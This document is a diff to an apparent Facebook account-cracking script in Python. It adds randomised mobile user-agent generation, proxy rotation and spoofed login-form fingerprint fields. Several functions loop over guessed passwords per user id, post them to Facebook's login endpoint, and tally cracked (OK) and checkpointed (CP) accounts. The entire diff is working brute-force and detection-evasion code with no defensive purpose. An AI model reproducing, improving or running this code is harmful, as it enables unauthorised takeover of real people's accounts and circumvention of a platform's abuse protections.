@@ -246,6 +246,37 @@ for ua in range(10000):
     l='Chrome/107.0.0.0 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     uas.append(uaku2)
+ugens = []
+for t in range(10000):
+	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
+	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
+	c=random.randrange(111111,210000)
+	d=random.randrange(11,19)
+	e=random.randrange(73,100)
+	f=random.randrange(4200,4900)
+	g=random.randrange(40,150)
+	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
+	random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
+	random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
+	random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
+	random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
+	random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
+	random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
+	random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
+	random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
+	random10=random.choice(['WOW64'])
+	demias1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias3=f'Mozilla/5.0 (Linux; Android {a}; {random3} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias4=f'Mozilla/5.0 (Linux; Android {a}; {random4} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias5=f'Mozilla/5.0 (Linux; Android {a}; {random5} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias6=f'Mozilla/5.0 (Linux; Android {a}; {random6} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias7=f'Mozilla/5.0 (Linux; Android {a}; {random7} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias8=f'Mozilla/5.0 (Linux; Android {a}; {random8} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	demias10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
+	uaku2 = random.choice([demias1,demias2,demias3,demias4,demias5,demias6,demias7,demias8,demias9,demias10])
+	ugens.append(uaku2) 
 
 red = "\033[1;31m"
 green = "\033[1;32m"
@@ -1356,6 +1387,7 @@ def p(uid,pwx,tl):
         for pw in pwx:
             nip=random.choice(xvx)
             proxs= {'http': nip}
+            ua = random.choice(ugens)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
@@ -1364,25 +1396,27 @@ def p(uid,pwx,tl):
             'try_number': '0',
             'unrecognized_tries': '0',
             'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
             'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
+            'is_smart_lock': 'false',
             'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcNW7dnKAb_WUqhir8ZBk8LUcBFsiIuSHq2OKV8gUs2Ofl2jNxTnQw:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw',
             'csr': '',
-            'req': 'a',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
-            headers = {'authority':'mbasic.facebook.com',
+            'req': '2',
+            'fmt': '1',
+            'a': 'AYlZYUDiZqtfVxy_hd3jd217cyf2OexqVPFlTnUxynLWBo_wjxuJYFLWrUtycfiSD0Z65CyKW4F3k-tk1mj_6diK9rYLliY-s2Y5TR-47hJBog',
+            'user': '0'}
+            headers = {'authority':'x.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1397,9 +1431,9 @@ def p(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
+            'user-agent': ua}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://x.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1441,6 +1475,7 @@ def p(uid,pwx,tl):
         pass
 
 
+
 def x(uid,pwx,tl):
     global oks
     global cps
@@ -1453,19 +1488,36 @@ def x(uid,pwx,tl):
         for pw in pwx:
             nip=random.choice(xvx)
             proxs= {'http': nip}
+            ua = random.choice(uas)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email": uid,
-            "pass": pw,
-            "login":"Log In"}
-            headers = {'authority':'mbasic.facebook.com',
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcNW7dnKAb_WUqhir8ZBk8LUcBFsiIuSHq2OKV8gUs2Ofl2jNxTnQw:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wGwcq0RE1u86i0h-0zE1bE881eEdEG0hi0Lo6-0Co178dE1UU3jw',
+            'csr': '',
+            'req': '2',
+            'fmt': '1',
+            'a': 'AYlZYUDiZqtfVxy_hd3jd217cyf2OexqVPFlTnUxynLWBo_wjxuJYFLWrUtycfiSD0Z65CyKW4F3k-tk1mj_6diK9rYLliY-s2Y5TR-47hJBog',
+            'user': '0'}
+            headers = {'authority':'x.facebook.com',
             'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -1482,7 +1534,7 @@ def x(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://x.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1635,7 +1687,7 @@ def freeq(uid,pwx,tl):
             proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data = {
+            data ={
             'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             'try_number': '0',
@@ -1655,7 +1707,7 @@ def freeq(uid,pwx,tl):
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'dyn': '',
             'csr': '',
-            'req': 'b',
+            'req': '5',
             'a': '',
             '__user': '0',
             '_fb_noscript': 'true'}
@@ -1676,7 +1728,7 @@ def freeq(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasc.facebook.com/login/device-based/login/async/"
+            url = "https://mbasic.facebook.com/login/device-based/login/async/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1724,7 +1776,7 @@ def d(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M6) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1732,14 +1784,30 @@ def d(uid,pwx,tl):
             proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data = {
-            'lsd': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'jazoest': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            data ={
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
             'email': uid,
-            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
-            'flow': 'login_no_pin',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'true',
+            'bi_xrwh': '0',
             'pass': pw,
-            'login': 'Log in'}
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '',
+            'csr': '',
+            'req': '5',
+            'a': '',
+            '__user': '0',
+            '_fb_noscript': 'true'}
             headers = {'authority':'mbasic.facebook.com',
             'method': 'POST',
             'scheme': 'https',
